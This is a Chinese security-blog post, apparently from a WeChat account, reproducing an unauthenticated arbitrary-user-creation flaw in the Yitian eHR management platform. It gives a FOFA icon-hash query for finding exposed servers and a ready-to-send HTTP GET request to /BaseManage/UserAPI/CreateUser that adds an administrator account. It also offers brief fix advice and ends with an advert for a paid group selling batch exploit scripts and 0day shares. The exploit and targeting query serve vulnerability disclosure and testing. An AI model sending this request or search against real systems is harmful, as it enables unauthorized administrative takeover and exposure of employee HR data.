#  「漏洞复现」易天智能eHR管理平台 CreateUser 任意用户添加漏洞   
冷漠安全  冷漠安全   2024-06-27 18:23  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
易天智能eHR管理平台是一款功能全面、智能化的人力资源管理软件，旨在帮助企业提高人力资源管理效率和管理水平。该平台通过集成员工信息、薪酬管理、档案人事管理、绩效管理和招聘管理等多个模块，实现了人力资源管理的全面智能化管理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpiatXelAM3sWgjXd3XmRCINia3DLQddHrzWkS4VzQkIWiarXFEsIyZfsBxw/640?wx_fmt=png&from=appmsg "")  
  
0x03  
  
**漏洞威胁**  
  
易天智能eHR管理平台 /BaseManage/UserAPI/CreateUser 接口存在任意用户添加漏洞，未经身份验证的远程攻击者可以利用此漏洞添加任意管理员用户，导致攻击者可直接管理后台，造成信息泄露，使系统处于极不安全的状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
icon_hash="314318290" || icon_hash="1727609737"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpiajtRGpDTEGWAJ5bCT9XjcdXp53XHw4Dib8nL3F0yWQdayM3ZquRwk4vg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /BaseManage/UserAPI/CreateUser?Account=hello&Password=123456&OuterID=998 HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpia9B2a94DgnqZ6e1oJSVU13KSFQicZKS6XTMrpiaic7Jnsee2DrjB4z9mrg/640?wx_fmt=png&from=appmsg "")  
  
登录验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpiavgyfjsAK199CesmOKgfKKU8icQic51ibtc5Jjlcxl2QzxIGJibHYqanDPA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpiaOwuhGV3R1JWNGTQHI6SdL4j4lFLEsRbjCX5btyxJvKtFs2HhUBmk7Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpiaPthJQLvertkuN0tUKnbftf3Ic45dHqdkDXp55SzfgF5dILPcwKs4Gg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qgPkKfIhsibOKwJSW17kicpiaFVqwY06GE8xbiaeoshlqMMP7ColSNoSG6KlD4og1icPaRibWQWy6fmZrg/640?wx_fmt=gif&from=appmsg "")  
  
  
